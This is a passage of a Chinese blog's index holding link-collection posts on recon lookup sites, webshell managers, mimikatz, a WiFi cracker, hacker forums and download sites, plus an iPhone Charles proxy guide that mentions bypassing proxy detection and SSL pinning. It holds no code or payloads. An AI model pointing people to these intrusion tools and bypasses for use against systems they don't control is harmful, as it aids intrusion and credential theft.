    <title>在线工具收集</title>
    <url>/cnblogs.github.io/p/4650.html</url>
    <content><![CDATA[<h3 id="查询网站备案信息"><a href="#查询网站备案信息" class="headerlink" title="查询网站备案信息"></a>查询网站备案信息</h3><table>
<thead>
<tr>
<th>工具名称</th>
<th>网站地址</th>
</tr>
</thead>
<tbody><tr>
<td>域名备案查询</td>
<td><a href="http://icp.chinaz.com/">http://icp.chinaz.com/</a></td>
</tr>
<tr>
<td>ICP备案查询网</td>
<td><a href="https://www.beianx.cn/">https://www.beianx.cn/</a></td>
</tr>
</tbody></table>
<h3 id="查询DNS历史记录"><a href="#查询DNS历史记录" class="headerlink" title="查询DNS历史记录"></a>查询DNS历史记录</h3><table>
<thead>
<tr>
<th>工具名称</th>
<th>网站地址</th>
</tr>
</thead>
<tbody><tr>
<td>威胁分析与情报共享社区</td>
<td><a href="https://x.threatbook.com/">https://x.threatbook.com/</a></td>
</tr>
</tbody></table>
<h3 id="IP反查域名"><a href="#IP反查域名" class="headerlink" title="IP反查域名"></a>IP反查域名</h3><table>
<thead>
<tr>
<th>工具名称</th>
<th>网站地址</th>
</tr>
</thead>
<tbody><tr>
<td>网站IP查询-站长之家</td>
<td><a href="https://tool.chinaz.com/same">https://tool.chinaz.com/same</a></td>
</tr>
<tr>
<td>网站IP查询-站长工具</td>
<td><a href="https://tool.chinaz.com/same">https://tool.chinaz.com/same</a></td>
</tr>
</tbody></table>
<h3 id="Whois反查"><a href="#Whois反查" class="headerlink" title="Whois反查"></a>Whois反查</h3><table>
<thead>
<tr>
<th>工具名称</th>
<th>网站地址</th>
</tr>
</thead>
<tbody><tr>
<td>域名反查-站长之家</td>
<td><a href="https://whois.chinaz.com/reverse?ddISearchMode=1">https://whois.chinaz.com/reverse?ddISearchMode=1</a></td>
</tr>
<tr>
<td>域名反查-金名网whois查询</td>
<td><a href="http://whois.4.cn/reverse">http://whois.4.cn/reverse</a></td>
</tr>
<tr>
<td>域名反查-爱站网</td>
<td><a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></td>
</tr>
<tr>
<td>VirusTotal</td>
<td><a href="http://www.virustotal.com/">http://www.virustotal.com</a></td>
</tr>
</tbody></table>
<h3 id="CMS资产扫描"><a href="#CMS资产扫描" class="headerlink" title="CMS资产扫描"></a>CMS资产扫描</h3><table>
<thead>
<tr>
<th>工具名称</th>
<th>网站地址</th>
</tr>
</thead>
<tbody><tr>
<td>云悉指纹</td>
<td><a href="http://www.yunsee.cn/">http://www.yunsee.cn/</a></td>
</tr>
</tbody></table>
<h3 id="证书透明度"><a href="#证书透明度" class="headerlink" title="证书透明度"></a>证书透明度</h3><table>
<thead>
<tr>
<th>工具名称</th>
<th>网站地址</th>
</tr>
</thead>
<tbody><tr>
<td>ssl证书询</td>
<td><a href="https://crt.sh/">https://crt.sh</a></td>
</tr>
</tbody></table>
<h3 id="在线子域名扫描地址"><a href="#在线子域名扫描地址" class="headerlink" title="在线子域名扫描地址"></a>在线子域名扫描地址</h3><table>
<thead>
<tr>
<th>工具名称</th>
<th>网站地址</th>
</tr>
</thead>
<tbody><tr>
<td>子域名查询</td>
<td><a href="https://tool.chinaz.com/subdomain">https://tool.chinaz.com/subdomain</a></td>
</tr>
<tr>
<td>DNS查询</td>
<td><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></td>
</tr>
</tbody></table>
<h3 id="检测服务器是否用CDN"><a href="#检测服务器是否用CDN" class="headerlink" title="检测服务器是否用CDN"></a>检测服务器是否用CDN</h3><table>
<thead>
<tr>
<th>工具名称</th>
<th>网站地址</th>
</tr>
</thead>
<tbody><tr>
<td>国内多地ping</td>
<td><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></td>
</tr>
<tr>
<td>国外多地ping</td>
<td><a href="http://www.webkaka.com/Ping.aspx">http://www.webkaka.com/Ping.aspx</a></td>
</tr>
</tbody></table>
<h3 id="历史漏洞信息查询"><a href="#历史漏洞信息查询" class="headerlink" title="历史漏洞信息查询"></a>历史漏洞信息查询</h3><table>
<thead>
<tr>
<th>工具名称</th>
<th>网站地址</th>
</tr>
</thead>
<tbody><tr>
<td>乌云</td>
<td><a href="http://wy.zone.ci/">http://wy.zone.ci/</a></td>
</tr>
<tr>
<td>Wooyun Drops</td>
<td><a href="https://wooyun.kieran.top/#!/">https://wooyun.kieran.top/#!/</a></td>
</tr>
<tr>
<td>数据库漏洞</td>
<td><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></td>
</tr>
<tr>
<td>知道创宇</td>
<td><a href="https://www.seebug.org/">https://www.seebug.org</a></td>
</tr>
</tbody></table>
<h3 id="在线文件安全检测"><a href="#在线文件安全检测" class="headerlink" title="在线文件安全检测"></a>在线文件安全检测</h3><table>
<thead>
<tr>
<th>工具名称</th>
<th>网站地址</th>
</tr>
</thead>
<tbody><tr>
<td>360沙箱云</td>
<td><a href="https://ata.360.net/">https://ata.360.net/</a></td>
</tr>
<tr>
<td>360手机软件安全检测</td>
<td><a href="http://scan.shouji.360.cn/">http://scan.shouji.360.cn/</a></td>
</tr>
<tr>
<td>Jotti恶意软件扫描程序</td>
<td><a href="https://virusscan.jotti.org/">https://virusscan.jotti.org/</a></td>
</tr>
<tr>
<td>VirScan多引擎文件检测平台</td>
<td><a href="https://www.virscan.org/">https://www.virscan.org/</a></td>
</tr>
<tr>
<td>VirusTotal可疑文件分析服务网站</td>
<td><a href="https://www.virustotal.com/">https://www.virustotal.com/</a></td>
</tr>
<tr>
<td>安恒云沙箱</td>
<td><a href="https://sandbox.dbappsecurity.com.cn/">https://sandbox.dbappsecurity.com.cn/</a></td>
</tr>
<tr>
<td>魔盾安全分析</td>
<td><a href="https://www.maldun.com/submit/submit_file/">https://www.maldun.com/submit/submit_file/</a></td>
</tr>
<tr>
<td>奇安信威胁情报中心</td>
<td><a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></td>
</tr>
<tr>
<td>深信服云沙箱</td>
<td><a href="https://ti.sangfor.com.cn/sandbox-dashboard">https://ti.sangfor.com.cn/sandbox-dashboard</a></td>
</tr>
<tr>
<td>腾讯哈勃分析系统</td>
<td><a href="https://habo.qq.com/">https://habo.qq.com/</a></td>
</tr>
<tr>
<td>腾讯移动安全实验室</td>
<td><a href="https://m.qq.com/security_lab/scans_online.jsp">https://m.qq.com/security_lab/scans_online.jsp</a></td>
</tr>
<tr>
<td>微步在线云沙箱</td>
<td><a href="https://s.threatbook.com/">https://s.threatbook.com/</a></td>
</tr>
<tr>
<td>云鉴定</td>
<td><a href="http://www.scanvir.com/">http://www.scanvir.com</a></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Website</category>
      </categories>
      <tags>
        <tag>Website</tag>
      </tags>
  </entry>
  <entry>
    <title>开发工具与网站工具收集</title>
    <url>/cnblogs.github.io/p/2602.html</url>
    <content><![CDATA[<blockquote>
<p>开发工具</p>
</blockquote>
<table>
<thead>
<tr>
<th>工具名称</th>
<th>下载地址</th>
<th>系统</th>
</tr>
</thead>
<tbody><tr>
<td>VSCode</td>
<td><a href="https://pan.baidu.com/s/1fC3nPACmrT_4itTYYu2PRQ?pwd=gv4z">https://pan.baidu.com/s/1fC3nPACmrT_4itTYYu2PRQ?pwd=gv4z</a></td>
<td>Windows</td>
</tr>
<tr>
<td>Charles</td>
<td><a href="https://pan.baidu.com/s/1GQe5ddF-9jybVw8g7RfjQw?pwd=fkd3">https://pan.baidu.com/s/1GQe5ddF-9jybVw8g7RfjQw?pwd=fkd3</a></td>
<td>Windows</td>
</tr>
<tr>
<td>Xterminal</td>
<td><a href="https://pan.baidu.com/s/1DaiQWVJig5nLiUQ8TV-5zw?pwd=p857">https://pan.baidu.com/s/1DaiQWVJig5nLiUQ8TV-5zw?pwd=p857</a></td>
<td>Windows</td>
</tr>
<tr>
<td>TreeSizeFree</td>
<td><a href="https://pan.baidu.com/s/1ZVhfuW7Q7C7wdVWK03-85A?pwd=hzr5">https://pan.baidu.com/s/1ZVhfuW7Q7C7wdVWK03-85A?pwd=hzr5</a></td>
<td>Windows</td>
</tr>
</tbody></table>
<blockquote>
<p>网站工具</p>
</blockquote>
<table>
<thead>
<tr>
<th>工具名称</th>
<th>网站地址</th>
</tr>
</thead>
<tbody><tr>
<td>Snapdrop文件传输</td>
<td><a href="https://drop.ioiox.com/">https://drop.ioiox.com/</a></td>
</tr>
<tr>
<td>GreenVideo免费播放</td>
<td><a href="https://greenvideo.cc/">https://greenvideo.cc/</a></td>
</tr>
<tr>
<td>m3u8视频在线提取</td>
<td><a href="https://fly63.com/tool/m3u8/">https://fly63.com/tool/m3u8/</a></td>
</tr>
<tr>
<td>PDF Editor Free</td>
<td><a href="https://www.pdfescape.com/">https://www.pdfescape.com/</a></td>
</tr>
<tr>
<td>在线电子书转换器</td>
<td><a href="http://cn.epubee.com/">http://cn.epubee.com/</a></td>
</tr>
<tr>
<td>美国地址生成器</td>
<td><a href="https://www.meiguodizhi.com/">https://www.meiguodizhi.com/</a></td>
</tr>
<tr>
<td>飞书社群</td>
<td><a href="https://www.feishu.cn/community/prompts">https://www.feishu.cn/community/prompts</a></td>
</tr>
</tbody></table>
<blockquote>
<p>在线免费接口</p>
</blockquote>
<table>
<thead>
<tr>
<th>接口名称</th>
<th>网站地址</th>
</tr>
</thead>
<tbody><tr>
<td>free-api</td>
<td><a href="https://www.free-api.com/">https://www.free-api.com/</a></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Website</category>
      </categories>
      <tags>
        <tag>Website</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防工具与项目收集</title>
    <url>/cnblogs.github.io/p/85e6.html</url>
    <content><![CDATA[<h3 id="速查手册"><a href="#速查手册" class="headerlink" title="速查手册"></a>速查手册</h3><table>
<thead>
<tr>
<th>网站名称</th>
<th>网站地址</th>
<th>网站描述</th>
</tr>
</thead>
<tbody><tr>
<td>红队命令速查</td>
<td><a href="https://book.shentoushi.top/">https://book.shentoushi.top/</a></td>
<td>整合Windows系统和linux系统命令</td>
</tr>
</tbody></table>
<h3 id="Webshell工具"><a href="#Webshell工具" class="headerlink" title="Webshell工具"></a>Webshell工具</h3><table>
<thead>
<tr>
<th>项目名称</th>
<th>项目地址</th>
<th>项目描述</th>
</tr>
</thead>
<tbody><tr>
<td>中国蚁剑</td>
<td><a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></td>
<td>中国蚁剑是一款开源的跨平台网站管理工具</td>
</tr>
<tr>
<td>冰蝎</td>
<td><a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></td>
<td>冰蝎是一款基于Java开发的动态二进制加密通信流量的新型Webshell客户端</td>
</tr>
<tr>
<td>哥斯拉</td>
<td><a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></td>
<td>哥斯拉是一款继冰蝎之后又一款于Java开发的加密通信流量的新型Webshell客户端</td>
</tr>
<tr>
<td>Web版菜刀（w8ay）</td>
<td><a href="https://github.com/boy-hack/WebshellManager">https://github.com/boy-hack/WebshellManager</a></td>
<td>w8ay是Hacking8安全信息流站长早些年用PHP+MySQL写的一款半成品一句话WEB端管理工具</td>
</tr>
<tr>
<td>Web版菜刀（WebKnife）</td>
<td><a href="https://github.com/MoLeft/WebKnife">https://github.com/MoLeft/WebKnife</a></td>
<td>WebKnife是陌小离练习ajax时候写的一款半成品Web版菜刀</td>
</tr>
<tr>
<td>开山斧</td>
<td><a href="https://github.com/pyqteval/evlal_win">https://github.com/pyqteval/evlal_win</a></td>
<td>开山斧是一款基于Python 2.7X + QT4开发的一款跨平台菜刀 (Win&#x2F;Linux&#x2F;Mac)</td>
</tr>
<tr>
<td>K8飞刀</td>
<td><a href="https://github.com/k8gege/K8tools">https://github.com/k8gege/K8tools</a></td>
<td>K8飞刀是K8哥哥开发的一款Webshell网站管理工具</td>
</tr>
<tr>
<td>Altman</td>
<td><a href="https://github.com/keepwn/Altman">https://github.com/keepwn/Altman</a></td>
<td>Altman基于.Net4.0开发，整个程序采用mef插件架构</td>
</tr>
<tr>
<td>Hatchet</td>
<td><a href="https://github.com/euphrat1ca/hatchet">https://github.com/euphrat1ca/hatchet</a></td>
<td>hatchet基于C++开发，是继中国菜刀后比较早放出来的一款Webshell网站管理工具</td>
</tr>
<tr>
<td>C刀（Cknife）</td>
<td><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></td>
<td>C刀是一款基于Java开发的完全基于配置文件的中国菜刀</td>
</tr>
<tr>
<td>QuasiBot</td>
<td><a href="https://github.com/Smaash/quasibot">https://github.com/Smaash/quasibot</a></td>
<td>QuasiBot是一款php编写的webshell管理工具，可以对webshell进行远程批量管理</td>
</tr>
<tr>
<td>Weevely</td>
<td><a href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></td>
<td>Weevely是一款python编写的生成和管理php webshell的安全测试工具</td>
</tr>
<tr>
<td>WeBaCoo</td>
<td><a href="https://github.com/anestisb/WeBaCoo">https://github.com/anestisb/WeBaCoo</a></td>
<td>WeBaCoo是一款Perl语言编写的Web后门工具，</td>
</tr>
<tr>
<td>Webhandler</td>
<td><a href="https://github.com/lnxg33k/webhandler">https://github.com/lnxg33k/webhandler</a></td>
<td>Webhandler是一款Python语言编写的php webshell安全测试工具</td>
</tr>
<tr>
<td>Webshell-Sniper</td>
<td><a href="https://github.com/WangYihang/Webshell-Sniper">https://github.com/WangYihang/Webshell-Sniper</a></td>
<td>Webshell-Sniper是一款Python语言编写的webshell管理器</td>
</tr>
<tr>
<td>Metasploit</td>
<td><a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></td>
<td>Metasploit虽说不是一款Webshell网站管理工具，但是已经具备了该有的功能，甚至更加强大</td>
</tr>
<tr>
<td>PhpSploit</td>
<td><a href="https://github.com/nil0x42/phpsploit">https://github.com/nil0x42/phpsploit</a></td>
<td>PhpSploit是一个由Python编写的后渗透利用框架，支持在Win&#x2F;Linux&#x2F;Mac等平台执行</td>
</tr>
<tr>
<td>SharPyShell</td>
<td><a href="https://github.com/antonioCoco/SharPyShell">https://github.com/antonioCoco/SharPyShell</a></td>
<td>SharPyShell是一个由Python编写的后渗透框架，用于C＃Web应用程序的小型混淆版ASP.NET WebShell</td>
</tr>
</tbody></table>
<h3 id="破译工具"><a href="#破译工具" class="headerlink" title="破译工具"></a>破译工具</h3><table>
<thead>
<tr>
<th>项目名称</th>
<th>项目地址</th>
<th>项目描述</th>
</tr>
</thead>
<tbody><tr>
<td>mimikatz</td>
<td><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></td>
<td>Mimikatz获取系统密码攻防研究</td>
</tr>
<tr>
<td>wifi-crack-tool</td>
<td><a href="https://github.com/baihengaead/wifi-crack-tool">https://github.com/baihengaead/wifi-crack-tool</a></td>
<td>WiFi密码暴破</td>
</tr>
</tbody></table>
<h3 id="入侵工具"><a href="#入侵工具" class="headerlink" title="入侵工具"></a>入侵工具</h3><table>
<thead>
<tr>
<th>项目名称</th>
<th>项目地址</th>
<th>项目描述</th>
</tr>
</thead>
<tbody><tr>
<td>开源入侵防御系统</td>
<td><a href="https://github.com/crowdsecurity/crowdsec">https://github.com/crowdsecurity/crowdsec</a></td>
<td>开源入侵防御系统</td>
</tr>
</tbody></table>
<h3 id="黑客系统"><a href="#黑客系统" class="headerlink" title="黑客系统"></a>黑客系统</h3><table>
<thead>
<tr>
<th>项目名称</th>
<th>项目地址</th>
<th>项目描述</th>
</tr>
</thead>
<tbody><tr>
<td>WIN10魔改的黑客系统</td>
<td><a href="https://github.com/makoto56/penetration-suite-toolkit">https://github.com/makoto56/penetration-suite-toolkit</a></td>
<td>WIN10魔改的黑客系统</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Website</category>
      </categories>
      <tags>
        <tag>Website</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器插件收集</title>
    <url>/cnblogs.github.io/p/caa.html</url>
    <content><![CDATA[<h3 id="谷歌浏览器插件"><a href="#谷歌浏览器插件" class="headerlink" title="谷歌浏览器插件"></a>谷歌浏览器插件</h3><table>
<thead>
<tr>
<th>插件类型</th>
<th>插件名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>安全插件</td>
<td>ScanAnnotation</td>
<td>扫描js里面的注释</td>
</tr>
<tr>
<td>安全插件</td>
<td>Proxy SwitchyOmega</td>
<td>浏览器代理插件</td>
</tr>
<tr>
<td>安全插件</td>
<td>Wappalyzer</td>
<td>网站分析工具</td>
</tr>
<tr>
<td>安全插件</td>
<td>X-Forwarded-For Header</td>
<td>X-Forwarded-For攻击</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Website</category>
      </categories>
      <tags>
        <tag>Website</tag>
      </tags>
  </entry>
  <entry>
    <title>资源网站收集</title>
    <url>/cnblogs.github.io/p/76.html</url>
    <content><![CDATA[<h3 id="系统资源网站"><a href="#系统资源网站" class="headerlink" title="系统资源网站"></a>系统资源网站</h3><table>
<thead>
<tr>
<th>资源名称</th>
<th>资源地址</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>哲风壁纸</td>
<td><a href="https://haowallpaper.com/">https://haowallpaper.com/</a></td>
<td>免费4K高清壁纸网站</td>
</tr>
<tr>
<td>MSDN系统库</td>
<td><a href="https://www.xitongku.com/">https://www.xitongku.com/</a></td>
<td>Window系统资源下载</td>
</tr>
<tr>
<td>ITELLYOU</td>
<td><a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></td>
<td>Window系统资源下载</td>
</tr>
</tbody></table>
<h3 id="资源下载网站"><a href="#资源下载网站" class="headerlink" title="资源下载网站"></a>资源下载网站</h3><table>
<thead>
<tr>
<th>资源名称</th>
<th>资源地址</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>极简插件</td>
<td><a href="https://chrome.zzzmh.cn/">https://chrome.zzzmh.cn/</a></td>
<td>Chrome 扩展插件下载</td>
</tr>
<tr>
<td>第一PPT</td>
<td><a href="https://www.1ppt.com/">https://www.1ppt.com/</a></td>
<td>贼好用的PPT模板站</td>
</tr>
<tr>
<td>SourceForge</td>
<td><a href="https://sourceforge.net/">https://sourceforge.net/</a></td>
<td>全球开源软件下载</td>
</tr>
</tbody></table>
<h3 id="学习资源网站"><a href="#学习资源网站" class="headerlink" title="学习资源网站"></a>学习资源网站</h3><table>
<thead>
<tr>
<th>资源名称</th>
<th>资源地址</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>菜鸟教程</td>
<td><a href="https://www.runoob.com/">https://www.runoob.com/</a></td>
<td>最全的 IT 教程学习网站</td>
</tr>
<tr>
<td>我要自学网</td>
<td><a href="https://www.51zxw.net/">https://www.51zxw.net/</a></td>
<td>专业软件使用进阶教程</td>
</tr>
<tr>
<td>玩游戏学编程</td>
<td><a href="https://www.codedex.io/">https://www.codedex.io/</a></td>
<td>想学 Python 的可以看看这个网站</td>
</tr>
</tbody></table>
<h3 id="开发资源网站"><a href="#开发资源网站" class="headerlink" title="开发资源网站"></a>开发资源网站</h3><table>
<thead>
<tr>
<th>资源名称</th>
<th>资源地址</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Nodejs</td>
<td><a href="https://nodejs.org/en/about/previous-releases">https://nodejs.org/en/about/previous-releases</a></td>
<td>前端nodejs资源</td>
</tr>
<tr>
<td>Openjdk</td>
<td><a href="https://learn.microsoft.com/zh-cn/java/openjdk/download">https://learn.microsoft.com/zh-cn/java/openjdk/download</a></td>
<td>后端openjdk资源</td>
</tr>
<tr>
<td>RPM</td>
<td><a href="https://rpmfind.net/linux/rpm2html/search.php">https://rpmfind.net/linux/rpm2html/search.php</a></td>
<td>Linux rpm仓库</td>
</tr>
</tbody></table>
<h3 id="闲杂资源下载网站"><a href="#闲杂资源下载网站" class="headerlink" title="闲杂资源下载网站"></a>闲杂资源下载网站</h3><table>
<thead>
<tr>
<th>资源名称</th>
<th>资源地址</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>4K指南</td>
<td><a href="https://xuexizhinan.com/">https://xuexizhinan.com/</a></td>
<td>4K原盘免费下载</td>
</tr>
<tr>
<td>哒哒影漫</td>
<td><a href="https://dddym.com/">https://dddym.com/</a></td>
<td>哒哒影漫</td>
</tr>
<tr>
<td>七安的资源宝库</td>
<td><a href="http://qianxx.ysepan.com/">http://qianxx.ysepan.com/</a></td>
<td>七安的资源宝库</td>
</tr>
<tr>
<td>乐载资源库</td>
<td><a href="http://www.lezaiziyuan.com/">http://www.lezaiziyuan.com/</a></td>
<td>乐载资源库</td>
</tr>
<tr>
<td>要教会资源库</td>
<td><a href="https://www.yaojiaohui.net/">https://www.yaojiaohui.net/</a></td>
<td>要教会资源库</td>
</tr>
<tr>
<td>阿Q代码</td>
<td><a href="http://www.aqcode.cn/">http://www.aqcode.cn/</a></td>
<td>阿Q代码</td>
</tr>
<tr>
<td>小蚂蚁资源网站</td>
<td><a href="https://www.xmy7.com/">https://www.xmy7.com/</a></td>
<td>小蚂蚁资源网站</td>
</tr>
<tr>
<td>教学教材</td>
<td><a href="https://github.com/TapXWorld/ChinaTextbook">https://github.com/TapXWorld/ChinaTextbook</a></td>
<td>所有小初高、大学PDF教材</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Website</category>
      </categories>
      <tags>
        <tag>Website</tag>
      </tags>
  </entry>
  <entry>
    <title>黑客网站与论坛收集</title>
    <url>/cnblogs.github.io/p/5fbe.html</url>
    <content><![CDATA[<h3 id="黑客论坛网站"><a href="#黑客论坛网站" class="headerlink" title="黑客论坛网站"></a>黑客论坛网站</h3><table>
<thead>
<tr>
<th>网站名称</th>
<th>网站地址</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>黑客基地</td>
<td><a href="https://www.hackbase.net/">https://www.hackbase.net/</a></td>
<td>当时最大的黑客教学网站，创建于2003年，创始人龙哥</td>
</tr>
<tr>
<td>红客联盟</td>
<td><a href="https://www.chinesehongker.com/forum.php">https://www.chinesehongker.com/forum.php</a></td>
<td>中国红客联盟 (H.U.C)</td>
</tr>
<tr>
<td>T00ls</td>
<td><a href="https://www.t00ls.com/">https://www.t00ls.com/</a></td>
<td>十年民间网络安全老牌社区,聚合安全领域最优秀的人群,低调研究潜心学习讨论各类网络安全知识</td>
</tr>
<tr>
<td>90Sec</td>
<td><a href="https://forum.90sec.com/">https://forum.90sec.com/</a></td>
<td>专注于信息安全领域的技术研究，是目前为数不多的高水平民间信息安全爱好者技术交流社区</td>
</tr>
<tr>
<td>吾爱破解</td>
<td><a href="https://www.52pojie.cn/portal.php">https://www.52pojie.cn/portal.php</a></td>
<td>致力于软件安全与病毒分析的非营利性技术论坛。</td>
</tr>
</tbody></table>
<h3 id="黑客技术网站"><a href="#黑客技术网站" class="headerlink" title="黑客技术网站"></a>黑客技术网站</h3><table>
<thead>
<tr>
<th>网站名称</th>
<th>网站地址</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Hack This Site</td>
<td><a href="https://www.hackthissite.org/">https://www.hackthissite.org/</a></td>
<td>该网上还提供挑战任务，来学习并练习技术，从初学者水平到高级难度的都有。</td>
</tr>
<tr>
<td>HackingLoops</td>
<td><a href="https://www.hackingloops.com/">https://www.hackingloops.com/</a></td>
<td>一个博客网站，主要面向初级水平的，网站上有许多非常有用的工具以及检验分享。</td>
</tr>
<tr>
<td>Exploit Database</td>
<td><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></td>
<td>数据库都是黑客的一个重要工具。</td>
</tr>
<tr>
<td>Hacksplaining</td>
<td><a href="https://www.hacksplaining.com/">https://www.hacksplaining.com/</a></td>
<td>学习黑客知识。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Website</category>
      </categories>
      <tags>
        <tag>Website</tag>
      </tags>
  </entry>
  <entry>
    <title>iPhone配置一【配置Charles作为网络代理】</title>
    <url>/cnblogs.github.io/p/b393.html</url>
    <content><![CDATA[<h3 id="一、Charles基础配置"><a href="#一、Charles基础配置" class="headerlink" title="一、Charles基础配置"></a>一、Charles基础配置</h3><p>开启代理服务打开Charles → Proxy &gt; Proxy Settings → 端口设为 8888，勾选 Enable transparent HTTP proxying ✅ 。<br>获取电脑IPHelp &gt; Local IP Address 查看本机IP（如 192.168.1.169）。</p>
<h3 id="二、iPhone代理设置"><a href="#二、iPhone代理设置" class="headerlink" title="二、iPhone代理设置"></a>二、iPhone代理设置</h3><p>连接同一WiFi确保iPhone与电脑在同一局域网。<br>配置HTTP代理设置 &gt; 无线局域网 &gt; 当前WiFi详情页 → HTTP代理 → 切换为 手动。服务器：填写电脑IP（如 192.168.1.169）。端口：8888 ✅ 。<br>允许Charles连接请求首次连接时，Charles会弹出提示 → 点击 Allow ✅ 。</p>
<h3 id="三、HTTPS抓包配置（关键步骤）"><a href="#三、HTTPS抓包配置（关键步骤）" class="headerlink" title="三、HTTPS抓包配置（关键步骤）"></a>三、HTTPS抓包配置（关键步骤）</h3><p>安装Charles证书到iPhoneCharles菜单：Help &gt; SSL Proxying &gt; Install Charles Root Certificate on a Mobile Device → 记下地址 chls.pro&#x2F;ssl ✅ 。iPhone用Safari访问 chls.pro&#x2F;ssl → 下载描述文件 → 设置 &gt; 已下载描述文件 完成安装。<br>信任证书（iOS 10.3+必需）设置 &gt; 通用 &gt; 关于本机 &gt; 证书信任设置 → 启用 Charles Proxy CA 的完全信任 ✅ 。<br>Charles启用SSL代理Proxy &gt; SSL Proxying Settings → 勾选 Enable SSL Proxying → Add 规则：Host: * （抓所有域名）Port: 443 ✅ 。</p>
<h3 id="四高级功能与调试技巧"><a href="#四高级功能与调试技巧" class="headerlink" title="四高级功能与调试技巧"></a>四高级功能与调试技巧</h3><p>模拟弱网环境Proxy &gt; Throttle Settings → 启用 Enable Throttling，设置带宽&#x2F;延迟参数（如延迟500ms）→ 测试APP在慢速网络的表现 ✅ 。<br>重发请求与修改参数右键抓到的请求 → Repeat（重发）或 Compose（修改参数后重发）→ 调试接口容错 ✅ 。<br>过滤无关请求Proxy &gt; Recording Settings → Include 中添加目标域名（如 *.weibo.cn），减少干扰 ✅ 。</p>
<h3 id="五常见问题解决"><a href="#五常见问题解决" class="headerlink" title="五常见问题解决"></a>五常见问题解决</h3><table>
<thead>
<tr>
<th>问题现象</th>
<th>解决方案</th>
</tr>
</thead>
<tbody><tr>
<td>无法安装证书</td>
<td>检查代理是否设置正确；关闭防火墙；确保Charles运行中 。</td>
</tr>
<tr>
<td>HTTPS请求仍显示乱码</td>
<td>确认手机证书已信任；Charles的SSL代理规则包含 *:443 。</td>
</tr>
<tr>
<td>APP检测代理拒绝连接</td>
<td>使用VPN工具（如Shadowrocket）转发流量绕过检测 ✅ 。</td>
</tr>
<tr>
<td>越狱设备绕过SSL Pinning</td>
<td>安装 SSL Kill Switch 2 插件禁用证书校验 ✅ 。</td>
</tr>
</tbody></table>
<p><strong>注意事项</strong></p>
<ul>
<li>抓包结束后关闭iPhone的HTTP代理，否则无法正常上网 。</li>
<li>敏感数据抓包需在安全环境下操作，避免隐私泄露 。</li>
</ul>
<p>按以上步骤操作，即可完整捕获iPhone的HTTP&#x2F;HTTPS流量。若需进一步分析加密协议或逆向工程，可结合越狱工具（如Frida）深度调试 。</p>
]]></content>
      <categories>
        <category>IPhone</category>
      </categories>
      <tags>
        <tag>IPhone</tag>
      </tags>
  </entry>
</search>
